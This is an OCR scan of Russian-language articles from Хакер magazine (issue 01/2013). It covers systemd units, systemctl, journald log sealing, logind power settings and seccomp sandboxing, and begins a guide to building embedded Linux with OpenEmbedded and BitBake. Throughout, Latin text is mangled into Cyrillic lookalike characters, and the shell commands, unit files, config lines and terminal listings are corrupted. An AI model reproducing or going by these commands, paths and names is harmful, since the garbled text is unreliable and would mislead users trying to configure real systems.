Иоѵ 19 03:04:44 ІосаІЬозі кегпеі: 1_іпих ѵегзіоп 3.5.4-1-ЯРСН (іоЬіаз@Т-РОИЯ-І_Х) (дсс ѵегзіоп 4.7 

Ьоѵ 19 03:04:44 ІосаІЬозі кегпеі: СоттапсІ Ііпе: гооі=/0еѵ/зс1аб го 

Моѵ 19 03:04:44 ІосаІЬозі кегпеі: е820: В 1 05-ргоѵ і сіесі рЬузісаІ РАМ тар: 

Ноѵ 19 03:04:44 ІосаІЬозі кегпеі: ВІО5-е820: [тет 0х0000000000000000-0х000000000009ГЬГП изаЫе 

Моѵ 19 03:04:44 ІосаІЬозі кегпеі: ВІО5-е820: [тет 0х00000000т00000-0х00000000тШГП гезегѵе 

Иоѵ 19 03:04:44 ІосаІЬозі кегпеі: ИХ (Ехесиіе ОізаЫе) ргоіесііоп: асііѵе 

Иоѵ 19 03:04:44 ІосаІЬозі кегпеі: йМІ ргезепі . 

Иоѵ 19 03:04:44 ІосаІЬозі кегпеі: йМІ : ЯБІІБТеК Сотриіег ІНС . К50АР/К50ЯР, ВІ05 203 02/02/201 

Моѵ 19 03:04:44 ІосаІЬозі кегпеі: е820: ирОаіе [тет 0х00000000-0х0000ГііП изаЫе ==> гезегѵеО 

Моѵ 19 03:04:44 ІосаІЬозі кегпеі: е820: гетоѵе [тет 0х000а0000-0х000ііііі] и 5 аЫе 



Вывод команды іоитаісіі 

а затем сгоп, который нуждается в зузіод, 
поскольку требует наличия его сокет-файла, 
зузіетсі просто создает этот сокет-файл за- 
ранее и запускает оба сервиса одновременно. 
При наличии большого количества системных 
демонов такой подход дает просто колоссаль- 
ный выигрыш в скорости загрузки. 

На том же принципе основана и система 
отложенного запуска. Где только возможно, 
зузіетсі старается отложить момент запуска 
демона до тех пор, пока в нем не возникнет 
реальная необходимость. Например, сервис 
печати сирз будет запущен только тогда, когда 
одно из приложений попробует обратиться 
к его сокет-файлу или сетевому порту. Демон 
зузіетсі будет самостоятельно слушать 
сетевой порт и в момент подключения к нему 
запустит сирз (так же, как это делает іпеісі). 
Благодаря этому полноценный десктоп на ос- 
нове зузіетсі удается загрузить буквально 
за несколько секунд, однако большинство сер- 
висов в этот момент остаются незапущенными. 

Очень важно, что в своей работе зузіетсі 
задействует многие возможности ядра Ыпих 
и других компонентов дистрибутива. Зузіетсі 
позволяет задать ограничения демона 
на ресурсы с помощью сдгоирз, изменить его 
приоритет или заставить работать во время 
простоев процессора. С помощью новейшей 
технологии зессотр становится возможным 
ограничить демон в системных вызовах, поме- 
стив его в песочницу. Также зузіетсі позволяет 
автоматически выполнять такие операции, 
как перезапуск демона в случае падения 
или его запуск в определенные промежутки 
времени (аналог сгоп). Все это реализуется 
стандартными средствами, без использования 
каких-либо внешних команд и скриптов. 

Вторая важная составляющая зузіетсі — 
это демон ритаИ, выступающий в роли 
полноценной замены зузіод. Его задача — ре- 
шить проблемы систем логирования прошлых 
поколений: введено строгое форматирование 
журнальных сообщений, криптографическая 
защита логов и подтверждение достоверности 
источника сообщений. Все сообщения по- 
падают в іоигпаісі в виде пар «ключ=значение» 
с возможностью прикрепления бинарных 
данных (например, для включения в отчет соге- 
дампов), источник подтверждается с помощью 
механизма сдгоир5 и систем контроля зузіетсі. 

Особое место в ]оигпаІсі занимает крипто- 
графическая система, основанная на том же 
принципе, что и система контроля версий діі. 



За каждой записью закрепляется хеш, от кото- 
рого будут зависеть хеши всех последующих за- 
писей. Имея эталонный начальный хеш, система 
сможет проверить легитимность всех записей 
журнала, так что, даже если взломщик изменит 
логи для сокрытия своей деятельности, админи- 
стратор сможет легко выявить подделку. 

Зузіетсі включает в себя менеджер пользо- 
вательских сессий Іодіпсі, отвечающий за фор- 
мирование пользовательского окружения, 
доступ пользователей к привилегированным 
операциям и данным и реагирование на вклю- 
чение питания и такие операции, как уход 
системы в сон и гибернацию. В состав зузіетсі 
входят демоны іітесіаіесі, Іосаіесі и Ьозіпатесі, 
которые отвечают за изменение времени, 
локали и имени хоста из внешних конфигура- 
торов. С недавних пор в пакет зузіетсі-іооіз 
также входит демон исіеѵ, отвечающий за го- 
рячее подключение устройств и правильное 
распознавание оборудования. 



КАК С ЭТИМ УПРАВИТЬСЯ? 



Несмотря на общую сложность и обилие воз- 
можностей, зузіетсі довольно прост в на- 
стройке и управлении. Фактически ты можешь 
не подозревать о его существовании, тогда 
как система будет работать прекрасно, во 
время загрузки запустятся только нужные 
сервисы, а другие будут запущены по мере на- 
добности. Это ключевая особенность зузіетсі 
как полностью автоматизированной умной 
системы. Тем не менее в форс-мажорных 
ситуациях может понадобиться вмешательство 
пользователя, и здесь без некоторой теории 
и новых знаний не обойтись. 

Ключевым элементом зузіетсі являются 
юниты (ипіі), которые грубо можно охарактери- 
зовать как некий аналог стартовых скрип- 



тов. Здесь они являются скорее логическим 
элементом, описывающим некую стадию 
работы системы. Юниты должны иметь строго 
определенный тип: 

• Сервис (.зегѵісе): стандартный демон, такой 
какарасНе или сгоп. 

• Сокет (.зоскеі): сетевые или файл-сокеты, 
которые могутописыватьфайл или порт, 
при обращении к которому произойдет за- 
пуск указанного сервиса. Фактически нужны 
просто для того, чтобы сервисы могли иметь 
их в качестве зависимости, вместо реальных 
сервисов. 

• Устройство (.сіеѵісе): любое устройство в си- 
стеме. Используется дляактивации какого- 
либо юнита при подключении железки. 

• Точка монтирования (.тоипі):точки монти- 
рования и файловые системы, подключае- 
мые на основе анализа /еіс/ізіаЬ. 

• Цели (.іагдеі): логический юнит, имеющий 
тотже смысл, что и «уровень запуска» (гип- 
ІеѵеІ) в стандартном іпіі. 

Это основные типы юнитов, помимо которых 
также доступны ііте-юниты для активации 
событий по таймеру (в стиле сгоп), зѵѵар-юниты 
для подключения свопа и раіЬ-юниты, по- 
зволяющие задать реакцию на события іпоіііу, 
такие как появление определенного файла. 

Все юниты представляют собой описание 
на специальном декларативном языке, рас- 
положенное в файле с соответствующим рас- 
ширением внутри каталогов /изг/ІіЬ/зузіетсі/ 
зузіет/ и /еіс/зузіепгкі/зузіет/. Не беда, если 
тебе это все кажется несколько непонятным, 
так как в обычной жизни ты, скорее всего, бу- 
дешь иметь дело только с сервисами, точками 
монтирования и целями, а за согласованной 
работой всех остальных юнитов будет следить 
система. 

Управление всеми юнитами в зузіетсі про- 
исходит с помощью единой команды зузіетсіі. 
Например, чтобы увидеть список активных 
юнитов, запусти команду без аргументов: 

$ зузТетси 

В списке ты должен увидеть сервисы, 
устройства, точки монтирования и прочее. 
Наиболее значимые колонки здесь — это пер- 
вая и четвертая, которые содержат имя юнита 
и его статус: ріиддес! для устройств, тоипіесі 




* Сравнение 
систем 

инициализации 
зузіетсі, ирзіагі 
иЗузѴіпіі- 

ОроіпіепіеМоз/ 

ргоі есіз/ѵѵЬу.ЬітІ 



ГАРАНТИЯ НЕИЗМЕННОСТИ ЛОГОВ 



Механизм Рогѵѵагсі Бесиге Беаііпд, реализованный в зузіетсі, призван 
гарантировать неизменность логов и не позволить злоумышленнику в случае 
успешной атаки на систему подменить записи в логе (таким образом, журнал 
можно удалить целиком, но нельзя тайно изменить или удалить отдельные 
записи). Суть технологии Р55 заключается в использовании методов 
криптографии с открытым ключом и формировании по цепочке проверочных 
хешей для всех записей лога. 



ХАКЕР 01 /168/2013 



10 ? 





ІМІХОШ 



> зузіетсіі зіаіиз сісгоп 

сісгоп.зегѵісе - Регіосііс СоттапсІ ЗсЬескіІег 

І_оас!ес1: Іоасіес! (/ызг/1 іь/зузіетсі/зузіет/сісгоп .зегѵісе; епаЫес!) 

Ясііѵе: асііѵе (гиппіпд) зіпсе Мог», 2012-11-19 04:09:15 УЕКТ; 13М адо 
Маіп РШ: 2919 (сгопс!) 

СВгоир : пате=зузІетс! : /зузіет/сісгоп . зегѵ і се 
1 2919 /изг/зЬіп/сгопс! -3 -1 іпГо 

1 



ЦНІТ РНЕ ЗТЙТЕ 

ргос-зуз-Із-ЬіпІті.тізс . аиіотоипі зіаі іс 

гіеѵ-Пидерадез. тоипі зіаііс 

йеѵ-триеие .тоипі зіаііс 

ргос-зуз-із-ЫпЛвІ_тізс тоипі зіаііс 

5уз-Гз-Ги5е-соппес1 іопз . тоипі віаі іс 

зуз-ІсегпеІ-сопПд .тоипі Біаііс 

зуз-кегпеІ-гіеЬид. тоипі зіаііс 

ітр. тоипі зіаііс 

сирз.раіП ОізаЫмІ 

зузІетсІ-взІс-рвззиогб-сопзоІе.раіИ зіаі іс 

зузіетсі-азк-раззиюгй-иа 1 1 . раім зіаі іс 

аіза-гезіоге.зегѵісе зіаііс 

аіза-зіоге.зегѵісе віаі іс 



Список всех юнитов системы 

для точек монтирования, гиппіпд для сервисов 
и так далее. Чтобы увидеть юниты, завершив- 
шиеся с ошибкой (упал АрасЬе, например), 
можно использовать такую команду: 

$ зуз^етсТІ - --Раііесі 

Чтобы узнать статус работы юнита, восполь- 
зуйся командой зіаіиг: 

$ зузТетс-Ц зіаіиз п§іпх 

Получить список всех юнитов можно так: 

$ зуз-ІетсТІ Іізіі-ипіі-біез 

Как и в случае с обычным іпіі, юниты 
можно запускать (команда 5Іагі), останавли- 
вать (зіор), перезапускать (гезіагі), включать 
при загрузке (епаЫе) и выключать (сІізаЫе). 

Все это делается точно так же, как раньше, 
за исключением того, что теперь необходимо 
набирать зузіетсіі вместо зегѵісе: 

$ зисіо зузіетсіі зТагІ п§іпх 

Кстати, благодаря тому, что зузіетсіі поме- 
щает каждый запускаемый сервис в свою кон- 
трольную группу, которая распространяется 
на всех потомков и выйти из которой нельзя, 
можно не беспокоиться, что при завершении 
сервиса в системе останутся его сироты. Мож- 
но, например, спокойно убить сервис и не ис- 
кать его детенышей: 

$ зисіо зузіетсіі кііі п§іпх 

Переход между уровнями запуска теперь 
происходит так: 

$ зисіо зузІетсИ ізоіаіе — 
гипіеѵеіз. Таг^еТ 
$ зисіо зуз^етсСІ ізоІаТе «-■ 
гип1еѵе15.1:аг§е1: 



Статус демона сгоп 



НАСТРОЙКИ, АВТОМОНТИРОВАНИЕ 
И УПРАВЛЕНИЕ ПИТАНИЕМ^НІ 



Как я уже говорил, на загрузке системы 
и управлении сервисами работа зузіетсі не за- 
канчивается. Например, зузіетсі теперь полно- 
стью отвечает за управление именем хоста, 
локалью, настройками клавиатуры и времени. 
Поэтому настройка соответствующих параме- 
тров теперь должна производиться так: 

• Имя хоста: 

$ зисіо Ьозіпатесіі зеІ-НозІпате ♦-« 
туЬозІпате 

• Локаль: 

$ зисіо Іосаіесіі зеІ:-1оса1е «-■ 

1_А1\1С=" ги_КІІ . ІІТР -8" 

• Клавиатура (работаетвотношении каккон- 
соли,такииксов): 

$ Іосаіес^і зе-С-кеутар ги 

• Часовой пояс: 

$ ТітесІаІ:есІ:1 зеІ-Тітегопе «-* 
Еигоре/Мозсом 

Как и в случае с обычным іпіі, юниты 
зузіетсі также отвечают за монтирование фай- 
ловых систем, однако благодаря возможности 
отложенного монтирования теперь мы можем 
легко добиться автомонтирования любого 
несистемного раздела, просто добавив в /еіс/ 
І5ІаЬ опцию х-зузіетсі. аиіотоипі. Например: 

/сІеѵ/зсІа7 /Йоте ех!4 поаи*о, — 
х-зузіетсі.аиіготоипі: 0 1 

Раздел /Йоте будет смонтирован только тогда, 
когда он реально понадобится. Автоматически 
подключить тома І_ѴМ при загрузке теперь 
можно, просто активировав сервис Іѵт: 



$ зисіо зузТетсІІ епаЫе Іѵт 
$ зисіо зузіетсИ епаЫе Іѵт-оп-сгурі 

Настроить управление питанием также 
можно с помощью зузіетс! (а точнее, его демо- 
на Іодіпсі), без задействования асрісі и рт-иіііз. 
Например, чтобы настроить уход в спящий 
режим после нажатия кнопки «Роѵѵег», доста- 
точно добавить следующую строку в файл /еіс/ 
зузіетсі/іодіпсі.сопі: 

НапсИеРомегКеу=5изрепсІ 

Вместо зизрепс! также можно использо- 
вать другие значения: ідпоге — пропустить, 
роѵѵегоЛ — отключить питание, геЬооІ — 
перезагрузить, ЬаІІ — выключить, зизрепс! — 
спящий режим, ЬіЬегпаІе — глубокий сон 
или кехес — загрузка другого ядра; вместо 
НапсІІеРоѵѵегКеу — такие события: 

• НапсІІеЗизрепсІКеу — нажатие кнопки «Спя- 
щий режим» (поумолчаниюзизрепсі); 

• НапсІІеНіЬегпаІеКеу — нажатие кнопки 
«Глубокий сон» (поумолчанию ЬіЬегпаІе); 

• НапсІІеЫсІБѵѵіІсЬ — закрытие крышки ноут- 
бука (поумолчаниюзизрепсі). 

Если необходимо запустить какие-либо 
команды в момент ухода в сон / пробуждения 
(например, остановка аудиопроигрывателя, 
синхронизация данных, закрытие несовме- 
стимых со спящим режимом приложений), 
можно использовать скрипты, размещаемые 
в каталоге /гузіетсі/зузіет-зіеер/. Скрипты 
могут иметь произвольное имя, но должны 
обрабатывать два аргумента: первый — рге 
или розі, сигнализирующий о том, засы- 
пает ли машина или выходит из сна, и вто- 
рой — зизрепс! или ЬіЬегпаІе, обозначающий 
используемый режим сна. Обычно при обо- 
их режимах следует выполнить одни и те 
же команды, поэтому в качестве заготовки 
для скриптов можно использовать следую- 
щий шаблон: 

• ѵі /и5г/1іЬ/5у5*етсІ/5у5*ет-5Іеер/4-і 
ехатрІе.зЬ 

#! /Ьіп/зЬ 
сазе $1/$2 іп 
рге/*) 

# Команды, выполняемые до... 
роз*/*) 

# Команды, выполняемые после... 



-Гз-І 



■Ьіпіті.тізс .аиіотоипі 
. . 00. 0-пеІ-еІП0. сіеѵісе 
0 . 0-пеІ-ш1ап0 . сіеѵісе 
. . Іоск-зРа-зРаІ . сіеѵісе 
. . 1оск-зс!а-5с!а2 . сіеѵісе 
. . 1 ос к-зс!а-зс1а5 .сіеѵісе 
. . Іоск-зсіа-зсіаб. сіеѵісе 
. . 1 ос к-зс!а-5СІа7. сіеѵісе 
. .0:0-Ыоск-зс1а. сіеѵісе 
. .0:0-Ыоск-5г0,с1еѵісе 



ЮНО ЙСТІѴЕ 51ІВ ЛОВ ОЕЗСЙІРТІОИ 

Іоасіесі асііѵе шаіііпд ЯгЬіІгагу ЕхесиІаЫе Рііе Рогтаіз 

Іоасіесі асііѵе ріиддесі РТЬѲ 1 1 1 /8 168В РСІ Ехргезз БідаЬіІ 

Іоасіесі асііѵе ріиддесі ЯР9285 Цігеіезз Иеішогк Рсіаріег (I 

Іоасіесі асііѵе ріиддесі 5Т9250315Я5 

Іоасіесі асііѵе ріиддесі БТ9250315О5 

Іоасіесі асііѵе ріиддесі 5Т9250315П5 

Іоасіесі асііѵе ріиддесі 5Т9250315Я5 

Іоасіесі асііѵе ріиддесі 5Т9250315Й5 

Іоасіесі асііѵе ріиддесі 5Т9250315Й5 

Іоасіесі асііѵе ріиддесі Біітіире РУР Я Р58Я45 



Вывод зузіетсіі 



110 



ХАКЕР 01 /168/2013 



Исполин, каких немного 



Просто пропиши нужные команды в со- 
ответствующих блоках, но имей в виду, 
что при наличии нескольких скриптов их за- 
пуск будет произведен одновременно. Кстати, 
завершать работу системы, а также пере- 
водить ее в различные режимы из консоли 
теперь следует с помощью таких команд (хотя 
никто не запрещает использовать классиче- 
ские геЬооІ, роѵѵегоН, ЬаІІ и рт-зизрепсі): 

# зуз*етс1:1 геЬооТ 

# зузіетсіі рокего-Р-Р 

# зузІетсТІ ЬаИ 

# зуз^етсИ зизрепсі 

# зуз^етсТІ ЬіЬегпаТе 

Если же требуется выполнить определен- 
ный набор команд во время загрузки, то это 
можно сделать двумя способами. Первый 
подойдет в том случае, если есть необходи- 
мость записи, чтения или удаления каких-либо 
файлов. Он основан на использовании юнита 
ІтрКІез, который выполняется при старте 
системы и действует на основе конфигураци- 
онных файлов, расположенных в каталоге /еіс/ 
ІтрРіІез.сІ/. Например, если тебе необходимо 
при загрузке выполнить команду «есЬо ІІ5ВЕ > 
/ргос/асрі/ѵѵакеир», отключающую пробужде- 
ние компа при подсоединении ІІ5В-устройств, 
то ты просто можешь создать файл /еіс/ 
ІтрКІез.сі/сіізаЫе-изЬ-ѵѵаке.соп^, содержащий 
такую строку: 

# ѵі /еіс/ітрбІез.сІ/сІізаЬІе-изЬ-маке.*-' 
соггР 

м /ргос/асрі/макеир - - - - ІІ5ВЕ 



Если требуется запуск команд, придет- 
ся создать новый юниттипа сервис по всем 
правилам зугіетсі. К счастью, сделать это го- 
раздо проще, чем написать стартовый скрипт 
для обычных систем инициализации: 

# ѵі /еісЛузіепкІ/зузіет/гс-ІосаІ.*-' 
5егѵісе 

[Шііі:] 

0езсгірТіоп=/е*с/гс . Іосаі сотра*іЬі1ііу 
[Бегѵісе] 

Туре=опезЬо* 

Ехес5ТагТ=КОМАНДА_ИЛИ_ПУТЬ_ДО__СКРИПТА 

КетаіпА-РіегЕхі1:=уе5 

[Іпзіаіі] 

1лІапТесІВу=ти1іі-и5ег . Таг§еТ 

Включать его запуск вручную не потре- 
буется, так как в конце файла четко указано, 
что он должен быть запущен на уровне запуска 
3 (тиііі-изег.іагдеі). 



ЖУРНАЛ 



Как я уже говорил, пакет зузіетсі включает 
в себя также демон журналирования іоигпаііі 
И хотя он и может сосуществовать рядом 
с другой системой логов, знать, как с ним 
обращаться, будет полезно хотя бы потому, 
что использовать его удобнее, чем тот же 
зузіод. Для чтения всего журнала достаточно 
выполнить команду ригпаісіі: 

$ зисіо зоигпаісіі 

В этом случае его вывод будет мало чем 
отличаться от вывода команды «саі /ѵаг/Іод/ 



теззадез». Однако, применив различные фла- 
ги и опции, мы можем конкретизировать его 
вывод. Например, указав в качестве аргумента 
путь до команды, можно получить на экран 
только ее сообщения: 

$ зисіо зоигпаісіі /изг/НЬ/зузіетсі/зузіетсІ 

Или сообщения, связанные с устройством: 

$ зисіо з'оигпаісіі /сіеѵ/зсіа 

Или сообщения определенного юнита: 

$ зисіо зоигпаісіі -и п§іпх 

Эту возможность, кстати, удобно использовать 
для дебага скриптов сна/пробуждения: 

$ зисіо зоигпаісіі -и зузіетсі- зизрепсі 

Указав флаг можно заставить команду вы- 
водить сообщения по мере их поступления: 

$ зисіо зоигпаіс*! -і 



ВЫВОДЫ 



Когда зузіетгі был интегрирован в мой люби- 
мый АгсЫіпих, я испугался, что теперь про- 
стоте и удобству дистрибутива придет конец. 
Однако, как выяснилось, несмотря на свою 
монструозность, новый демон оказался 
на удивление прост и удобен в использовании, 
а его идеология вполне соответствует принци- 
пам ІЛМІХ, когда большая система разбивается 
на множество независимых компонентов. ІЕ 









ИЗОЛИРОВАННЫЕ ОКРУЖЕНИЯ ДЛЯ ЗАПУСКАЕМЫХ СЕРВИСОВ 


• Леннарт Пот- 
теринг Неппагі 
РоеИегіпд) — 


БузІетсІ позволяет обеспечить изоляцию системных вызовов 
для запускаемых через него процессов. Пример помещения 
процесса в песочницу: 

[Бегѵісе] 

Ехес5іаг1:=/Ьіп/есЬо "I ат іп а запсІЬох" 
5узіетСа11Рі1іег=Ьгк ттар ассезз ореп -Рзіаі: сіозе ^ 
геасі -р5іаТ тргоТесі агсЬ_ргсТ1 типтар мгііе 


В отличие от АррАгтог или 5ЕЫпих, требуемые ограничения 
задаются на уровне защищаемого приложения, а не через 
внешние ограничения. Так, программа заранее объявляет 
список системных вызовов, которые будут использоваться. 
Если злоумышленник из-за уязвимости в программе получит 
возможность выполнить произвольный код, необъявленные 
системные вызовы остановит интегрированная в зузіетР 
система зессотр ПІІег (фильтры безопасного вычисления). 


сотрудник 
компании КеО Наі, 
создавший в свое 
время звуковой 
сервер РиІвеАікііо 
и систему АѵаЫ, 
которая обеспечи- 
вает возможность 
обнаружения сер- 
висов в локальной 
сети (свободная 
реализация про- 
токола 2егоСопН. 






• В состав 
вузіетгі включе- 
ны так называе- 






АВТОРСКИЙ МАСТЕР-КЛАСС ПО ОПТИМИЗАЦИИ НАСТРОЕК 5Ѵ5ТЕМ0 


мые генераторы, 
позволяющие 
создавать юниты 
автоматически. 


Леннарт Поттеринг подготовил руководство Іаоо.аІ/1 КОеѴѴ), 
в котором содержатся рекомендации о том, как сократить на 
стандартном ноутбуке с 550-накопителем время загрузки 
дистрибутива до менее чем двух секунд. В частности, 

Леннарт предлагает отказаться от использования «тяжелых» 
компонентов системы, таких как І_ѴМ, 5ЕЫпих (опция ядра зе- 
1іпих=0), программный РАЮ, шифрование, РІутоиІЬ (рІутоиіЬ. 
епаЫе=0), проанализировать скорость загрузки с помощью 


команды зузіегткі-апаіуге и отключить лишние юниты, 
отключить вывод диагностических сообщений в консоль, 
пересобрать ядро, включив в него все драйверы (отказаться от 
модулей) и отключив отладочные опции, использовать имена 
устройств вместо ІШЮ в /еІс/ЫаЬ, использовать опцию ядра 
ІіЬаИсі.ідпоге_555=1 для ускорения загрузки ядра и отключить 
поддержку виртуальных консолей с помощью деактивации 
соответствующих юнитов зузіетсі. 


• Зувіетгі от- 
личается высокой 
интеллектуаль- 
ностью. Напри- 
мер, алгоритмы 
остановки 
системы учи- 
тывают массу 
разнообразных 
форс-мажорных 
ситуаций и позво- 
ляют корректно 
из них выходить. 



ХАКЕР 01 /168/2013 



111 





ІШІХОШ 



Роман Ярыженко (готтапіоѲуапсіех.гиІ 



I 

Щк 




СОЗДАНИЕ 
ВСТРАИВАЕМЫХ 
СИСТЕМ НА ОСНОВЕ 
ФРЕЙМВОРКА 
ОРЕЫЕМВЕООЕО 



Что на 
стоит . 

Тукса 



В настоящее время встраиваемые системы 
используются повсеместно, достаточно 
вспомнить сенсорные информационные 
киоски, медиацентры, приставки, 
деревообрабатывающие станки... Во многих 
из них применяется Ыпих — разумеется, 
это не монструозный ІІЬипІи или СепЮБ, 
а специализированный дистрибутив, 
созданный с использованием конструктора 
и соответствующий заданным критериям. 



ВВЕДЕНИЕ 



Железо, которое используется для построения встраиваемых 
систем, зачастую вовсе не х86-совместимое, поэтому требования 
к ПО могут быть самыми разными. Я выделю базовые: 

• Надежность. Это требование очевидно. Тебе разве захочется, 
чтобы твоя микроволновка зависла? Думаю, нет. 

• Стоимость конечного устройства. И это тоже понятно — разра- 
ботчику, который производит много таких устройств, выгодно, 
чтобы каждое устройство обходилось ему как можно дешевле. 



• Низкое энергопотребление. Это уже забота о клиенте. А если 
оно будет высоким, то клиент купит другое устройство. 

Ыпих в той или иной мере соответствует этим требованиям. Он на- 
дежный, работает на многих платформах, и стоимость его разра- 
ботки стремится к нулю. 

Далее я дам краткий обзор существующих инструментов 
и фреймворков для разработки етЬесМесі-систем и покажу, 
как с использованием одного из них собрать собственный встраи- 
ваемый дистрибутив. 



ОБЗОР ИНСТРУМЕНТОВ РАЗРАБОТЧИКА 



• ОрепВгіскз. Фреймворкдля разработки встраиваемых дис- 
трибутивов. Поддерживает множество платформ, система 
конфигурации аналогична гентушной. 

• Виіісігооі. Набор таке-файлов и патчей, которые позволят 
быстро и просто собрать тулчейн для различных платформ. 

• ОрепЕтЬебсіесі. Достаточно интересное и молодое решение 
для создания встраиваемых дистрибутивов. Система сборки 
ВііВаке аналогична ебилдам бепіоо и позволяет гибко настраи- 
вать параметры собираемой системы. 

• Ореп\Л/ВТ. Дистрибутив для роутеров. По сути, это «встраива- 
емая система наоборот», поскольку позволяет пользователю 
самому устанавливать ПО на устройство. Это, конечно, не от- 
носится к тематике статьи, но не упомянуть его я не мог. 



112 



ХАКЕР 01 /168/2013 





Что нам стоит Тукса встроить? 



- 


Терминал • гот^гот-гіеікюр: -/ое-соге/ЬиіМ 


-4-Х 


Файл Правка Вид Терминал переход Справка 




Рагяпв гесхрез 


: 100% \*»**»**»********»»**ш***»ш******»*»0*і*ш*\ Тіие: 


00:01 07.1 


Рагяпв о* 818 


.ЬЬ Шез С0«р1«1в (445 сасЬеО. 373 рагзегі). 1116 Таг^еТз 


. 21 зкх 


рресі. 0 тазкеО, 


0 еггогз. 




ВихІО СопГіціігагіоп: 




В8.ѴЕ85І0М 


* "1.15.3" 




ТАКСЕ Т_АКСН 


= "1586“ 




ТАРСЕТ_05 


* "Ііпих" 




МАСНІМЕ 


= "«телюхвб" 




ОІЗТКО.ѴЕКЗКЖ 


= "ое-соге. 0" 




ТЦИЕ_РЕАТЦКЕ$ 


= "*32 І586" 




ТАКОЕТ.РРО 


* •• 




тета 

теіа-хакер 


= "«азіег :с6<1а6Ь64в328377Ъа3590Г<13всЫ2<1а<126а46а13" 




МОТЕ Кезоіѵіпф апу піззіпв іазк ччеие Оерепгіепсіез 

МОТЕ: Ргерагіпв гшіячеое 

МОТЕ: ЕхесііТіпв ЗеТЗсепе Тазкз 

МОТЕ: Ехесиііпв КипОиеие Тазкз 

Сиггепііу 1 гиппіп* Тазкз (1008 о* 1024): 




0 : лОЬ-сгозз-7. 


4.1-гІ.О <к>_соярі!е (рхй 4881) 





Всем лежать! Работает ВіІВаке! 



• МопІаѴІБІа. Фреймворк для создания встраиваемых систем. 
Этот продукт единственный из рассматриваемых здесь стоит 
денег, причем достаточно больших. Последняя его версия 
(шестая) включает в себя ЮЕ, основанный на Есіірзе, тул- 
чейн и собственно фреймворк — ядра самые разнообразные, 
как и поддержка всевозможных платформ — АРМ, МІР5, РРС... 

Выбрать, как видишь, есть из чего. Я буду описывать 
ОрепЕтЬесІсІесІ, но не думаю, что основные принципы силь- 
но отличаются, — зная, как собирать дистрибутив на основе 
ОрепЕтЬесІсІесІ, ты легко сможешь собрать его на основе того же 
ОрепВгіскз. ОрепЕтЬесІсІесІ существует в двух вариантах: старый, 
ОЕ-сІаззіс, и новый — ОЕ-соге, который я и буду описывать далее. 
ОЕ-соге появился в результате объединения ОрепЕтЬесІсІесІ 
с Ѵосіо Рго)есІ — опенсорсным проектом под патронажем Ыпих 
Роипсіаііоп. 

Первым делом надо установить соответствующие пакеты (ис- 
пользуется ХиЬипІи 12.04): 

$ зисіо ар-Ь-ееІ: іпз'СаІІ зесі м§е1: сѵз зиЬѵегзіоп — 

§і1:-соге согеи*іІ5 ипгір *ехі2ІП:т1 *ехігѵРо — 
сІосЬоок-иТіІз §аик руТНоп-рузцШіег сИ-Р-Рз*а* — 

Ье1р2тап таке §сс Ьиіісі-еззепіііаі §++ 
сіезктор-біе-иіііз сЬграІЬ 1іЬхт12-и*і1з хтііо сІосЬоок 

После этого, используя сіркд-гесопіідиге, переделать ссылку на зЬ, 
для чего набрать следующую команду: 

$ зисіо сірк§-гесопб§иге сІазЬ 

и ответить отрицательно. Создаем копию репозитория 6іІ: 

$ §ІТ сіопе §і*://§»іТ.орепетЬесІсІесІ.оге/орепетЬесІсІесІ-соге -* 
ое-соге 
$ ссі ое-соге 

$ §і-С сіопе еі*://8і*-орепетЬесІ<іесІ.ог§/Ьі*Ьаке ЬііЬаке 



ПОДГОТОВКА 



Теперь надо подготовить окружение. Для этого запускаем соот- 
ветствующий скрипт: 

$ . ./ое-іпі*-Ьиі1сІ-епѵ 

Откроем файл ЬиіІЬ/сопі/ІосаІ.сопі (все пути здесь и далее 
указаны относительно ОЕ-соге). Файл большой, поэтому ниже будет 
только его кусок. Все переменные здесь глобальны и переопреде- 
ляют все остальные, если таковые есть в других файлах. 




Сайт проекта ОрепЕтЬесМегі 



Ьиі1сі/сопТ/1оса1 . соп-Р 

# Опции распараллеливания 

# Сколько потоков ВіТВаке может выполняться одновременно? 

# По дефолту закомментировано, я же раскомментировал 
ВВ_МЦМВЕК_ТНКЕА05 = "4 й 

# Думаю, тут пояснять ничего не надо - но на всякий 

# случай... Опция передается команде таке и показывает, 

# сколько процессоров может быть задействовано при компи- 

# ляции. Желающие поэкспериментировать с оптимизацией 

# сборки могут задать п+1" или п+2", где п - 

# количество процессоров 
РАКАи_ЕІ__МАКЕ = н -3 4 м 

# Целевая машина. Если не выбрана никакая другая... 
МАСНІИЕ ??= "цетихвб" 

# Куда загружать? Имей в виду, что места на диске надо 

# много - у меня первый раз было 10 Гб свободно, и все 

# съело. Пришлось расширять 
#ОІ-_ОІК ?= "$Т0Р0ІК/сіомп1оасІ5" 

# Куда сохранять статические файлы для ускорения сборки 

# в дальнейшем? Тоже съедает много места 
#55ТАТЕ_ОІК ?= "$Т0Р0ІК/55ТаТе-сасЬе" 

# Система пакетов. Можно выбрать из следующих: 

# раска§е_сіеЬ, раскаве_грт, раска§е_ірк (для встраиваемых 

# систем; используется, например, в ОрепМКТ). Возможно 

# одновременное включение 
РАСКАСЕ_С1-А55Е5 = "раскаее_ірк н 

# Дополнительные параметры конфигурации образа 

# Добавляют некоторые фичи в создаваемый образ. Подробнее 

# можешь посмотреть в теТа/сІаззез/ітаее.ЬЬсІазз 

# и теТа/сІаззез/соге-ітаде.ЬЬсІазз 
ЕХТКА_ІМАСЕ_РЕАТІ)КЕ5 = м с1еЬи§-1\л»еак5" # установлено 

# по дефолту и создает образ с твиками для разработчика - 

# например, включение этой опции разрешает входить под 

# 55Н как рут без пароля. Не стоит и говорить, что это 

# никак не для промышленного применения 



СОЗДАНИЕ СВОЕГО ОБРАЗА 



Не терпится приступить к созданию образа? Можешь сделать это 
прямо сейчас — но не лучше ли внести какие-то изменения, пусть 
даже и косметические? А для этого необходимо немного разби- 
раться в конфигах ВіІВаке и представлять, что это за зверь вообще. 



ХАКЕР 01 /168/2013 



113 







ІМІХОШ 



ВііВаке — средство, написанное на Питоне (как неожиданно!), 
которое позволяет собирать пакеты. Основные фичи: 

# кросс-компиляция; 

# обработка зависимостей как для сборки, так и для запуска (ко- 
нечно, если они отражены в файлах *.ЬЬ/*.ЬЬсІазз); 

# неприхотливость к архитектуре — Питон же; 

# поддержка наследования. 

Чем МэЬсІазз отличается от *.ЬЬ? В классы вынесено все 
общее, что используется в файлах метаданных — *.ЬЬ, в которых 
описаны действия для сборки. Иначе говоря, классы здесь аб- 
страктные. Кроме того, от класса можно наследовать, а от файлов 
*.ЬЬ — нет. Еще имеются файлы *.соп! — они глобально влияют 
на все пакеты и классы. В них допускаются только определения 
